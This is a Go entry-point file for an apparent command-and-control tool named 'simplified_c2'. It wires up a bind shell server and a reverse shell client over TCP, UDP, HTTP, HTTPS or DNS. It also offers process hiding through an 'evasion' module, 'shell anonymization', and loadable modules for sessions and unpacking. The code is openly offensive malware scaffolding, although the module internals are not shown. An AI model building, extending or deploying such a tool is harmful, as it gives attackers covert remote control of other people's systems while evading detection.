package main

import (
	"flag"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"

	"github.com/simplified_c2/core/connector"
	"github.com/simplified_c2/core/security"
	"github.com/simplified_c2/module"
	"github.com/simplified_c2/modules/evasion"
	"github.com/simplified_c2/modules/sessions"
	"github.com/simplified_c2/modules/shell_anon"
	"github.com/simplified_c2/modules/unpacker"
)

func main() {

	serverCmd := flag.Bool("server", false, "Start in server mode (bind shell)")
	clientCmd := flag.Bool("client", false, "Start in client mode (reverse shell)")
	hostFlag := flag.String("host", "127.0.0.1", "Host to bind to or connect to")
	portFlag := flag.String("port", "8080", "Port to bind to or connect to")
	protocolFlag := flag.String("protocol", "tcp", "Protocol to use (tcp, udp, http, https, dns)")
	secureFlag := flag.Bool("secure", false, "Use secure communications")
	moduleListCmd := flag.Bool("list-modules", false, "List available modules")
	moduleCmd := flag.String("module", "", "Run a specific module")
	moduleInfoCmd := flag.String("module-info", "", "Show information about a module")
	anonymizeFlag := flag.Bool("anonymize", false, "Apply shell anonymization techniques")
	hideFlag := flag.Bool("hide", false, "Hide process")

	flag.Parse()

	moduleSystem := module.NewModuleSystem()

	registerBuiltinModules(moduleSystem)

	if *moduleListCmd {
		fmt.Println("Available modules:")
		for _, name := range moduleSystem.Registry.ListModules() {
			fmt.Printf("- %s\n", name)
		}
		os.Exit(0)
	}

	if *moduleInfoCmd != "" {
		fmt.Println("Module information for: " + *moduleInfoCmd)
		fmt.Println("-------------------" + strings.Repeat("-", len(*moduleInfoCmd)))
		factory, err := moduleSystem.Registry.GetModule(*moduleInfoCmd)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}
		mod := factory()
		info := mod.GetInfo()
		fmt.Printf("Name: %s\n", info.Name)
		fmt.Printf("Version: %s\n", info.Version)
		fmt.Printf("Description: %s\n", info.Description)
		fmt.Printf("Author: %s\n", info.Author)
		fmt.Println("\nCommands:")
		for _, cmd := range info.Commands {
			fmt.Printf("  %s - %s\n", cmd.Name, cmd.Description)
			fmt.Printf("    Usage: %s\n", cmd.Usage)
			fmt.Printf("    Options:\n")
			for k, v := range cmd.Options {
				fmt.Printf("      %s: %s\n", k, v)
			}
		}
		fmt.Println("\nOptions:")
		for k, v := range info.Options {
			fmt.Printf("  %s: %s\n", k, v)
		}
		os.Exit(0)
	}

	if *moduleCmd != "" {
		fmt.Printf("Running module: %s\n", *moduleCmd)

		mod, err := moduleSystem.Manager.LoadModule(*moduleCmd)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}

		info := mod.GetInfo()
		fmt.Printf("Module: %s (v%s)\n", info.Name, info.Version)
		fmt.Printf("Description: %s\n", info.Description)
		fmt.Printf("Author: %s\n", info.Author)

		if len(flag.Args()) > 0 {
			cmdName := flag.Args()[0]
			cmdArgs := flag.Args()[1:]

			var cmdInfo *module.CommandInfo
			for _, cmd := range info.Commands {
				if cmd.Name == cmdName {
					cmdInfo = &cmd
					break
				}
			}
			if cmdInfo == nil {
				fmt.Printf("Error: Command '%s' not found in module '%s'\n", cmdName, *moduleCmd)
				os.Exit(1)
			}
			fmt.Printf("Running command: %s\n", cmdName)
			fmt.Printf("Arguments: %v\n", cmdArgs)

			result, err := mod.ExecuteCommand(cmdName, cmdArgs)
			if err != nil {
				fmt.Printf("Error executing command: %v\n", err)
				os.Exit(1)
			}
			fmt.Printf("Result: %v\n", result)
		} else {
			fmt.Println("No command specified. Available commands:")
			for _, cmd := range info.Commands {
				fmt.Printf("  %s - %s\n", cmd.Name, cmd.Description)
				fmt.Printf("    Usage: %s\n", cmd.Usage)
			}
		}
		os.Exit(0)
	}

	if *anonymizeFlag {

		shellAnonModule, err := moduleSystem.Manager.LoadModule("shell_anon")
		if err != nil {
			fmt.Printf("Error loading shell_anon module: %v\n", err)
			os.Exit(1)
		}

		result, err := shellAnonModule.ExecuteCommand("setup", []string{})
		if err != nil {
			fmt.Printf("Error applying shell anonymization: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Shell anonymization applied: %v\n", result)
	}

	port, err := strconv.Atoi(*portFlag)
	if err != nil {
		fmt.Printf("Error parsing port: %v\n", err)
		os.Exit(1)
	}

	if *hideFlag {
		hideModule, err := moduleSystem.Manager.LoadModule("evasion")
		if err != nil {
			fmt.Printf("Error loading process_hider module: %v\n", err)
			os.Exit(1)
		}

		result, err := hideModule.ExecuteCommand("seccomp", []string{})
		if err != nil {
			fmt.Printf("Error applying process hiding: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Process hiding applied: %v\n", result)
	}
	var protocol connector.Protocol
	switch strings.ToLower(*protocolFlag) {
	case "tcp":
		protocol = connector.TCP
	case "udp":
		protocol = connector.UDP
	case "http":
		protocol = connector.HTTP
	case "https":
		protocol = connector.HTTPS
	case "dns":
		protocol = connector.DNS
	default:
		fmt.Printf("Error: Unsupported protocol: %s\n", *protocolFlag)
		os.Exit(1)
	}

	secManager := security.NewSecurityManager()

	if *serverCmd {
		fmt.Printf("Starting C2 server on %s:%d...\n", *hostFlag, port)

		config := &connector.ConnectorConfig{
			Type:           connector.BindShell,
			Protocol:       protocol,
			Host:           *hostFlag,
			Port:           port,
			Secure:         *secureFlag,
			SecurityConfig: secManager,
		}

		c := connector.NewConnector(config)
		err := c.Start()
		if err != nil {
			fmt.Printf("Error starting C2 server: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("C2 server started on %s:%d\n", *hostFlag, port)
		fmt.Println("Press Ctrl+C to stop")

		select {}
	}

	if *clientCmd {
		fmt.Printf("Starting C2 client to %s:%d...\n", *hostFlag, port)

		config := &connector.ConnectorConfig{
			Type:           connector.ReverseShell,
			Protocol:       protocol,
			Host:           *hostFlag,
			Port:           port,
			Secure:         *secureFlag,
			SecurityConfig: secManager,
		}

		c := connector.NewConnector(config)
		err := c.Start()
		if err != nil {
			fmt.Printf("Error starting C2 client: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("C2 client started to %s:%d\n", *hostFlag, port)
		fmt.Println("Press Ctrl+C to stop")

		select {}
	}

	if !*serverCmd && !*clientCmd && *moduleCmd == "" && !*moduleListCmd && *moduleInfoCmd == "" {
		fmt.Println("Error: You must specify at least one command")
		flag.Usage()
		os.Exit(1)
	}
}
func registerBuiltinModules(moduleSystem *module.ModuleSystem) {
	if runtime.GOOS == "linux" {
		evasionModule := evasion.NewModule()
		moduleSystem.Registry.RegisterModule("evasion", func() module.ModuleInterface {
			return evasionModule
		})
	}
	sessionModule := sessions.NewModule()
	moduleSystem.Registry.RegisterModule("sessions", func() module.ModuleInterface {
		return sessionModule
	})
	unpackerModule := unpacker.NewModule()
	moduleSystem.Registry.RegisterModule("unpacker", func() module.ModuleInterface {
		return unpackerModule
	})

	shellAnonModule := shell_anon.NewModule()
	moduleSystem.Registry.RegisterModule("shell_anon", func() module.ModuleInterface {
		return shellAnonModule
	})

}
